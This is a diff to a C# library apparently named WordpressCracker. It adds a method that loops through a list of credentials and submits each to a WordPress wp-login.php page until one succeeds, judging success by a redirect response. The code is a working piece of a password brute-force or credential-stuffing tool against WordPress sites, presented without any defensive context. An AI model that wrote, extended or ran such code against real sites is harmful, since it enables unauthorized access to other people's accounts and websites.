@@ -40,6 +40,30 @@ namespace Opapps.Lib.WordpressCracker.Services
             return CheckLoginSuccess(response);
         }
 
+        /// <summary>
+        /// Attempt to login to <paramref name="loginUrl"/> with each of the <paramref name="loginCredentials"/> using form-data authentication. 
+        /// Returns the successful <c>FormData</c> object if there is, otherwise returns null.
+        /// </summary>
+        /// <param name="loginUrl">The WordPress login page URL. For example: https://example.com/wp-login.php</param>
+        /// <param name="loginCredentials">The login credentials that to attempt the login.</param>
+        /// <returns></returns>
+        public async Task<FormData?> AttemptLoginRangeAsync(string loginUrl, IEnumerable<FormData> loginCredentials) {
+            FormData? correctLoginCredential = null;
+            
+            foreach(var loginCredential in loginCredentials)
+            {
+                bool isSuccess = await AttemptLoginAsync(loginUrl, loginCredential);
+
+                if (isSuccess)
+                {
+                    correctLoginCredential = loginCredential;
+                    break;
+                }
+            }
+
+            return correctLoginCredential;
+        }
+
         private bool CheckLoginSuccess(HttpResponseMessage response)
         {
             return (int) response.StatusCode == 302 || response.Headers.Location != null;
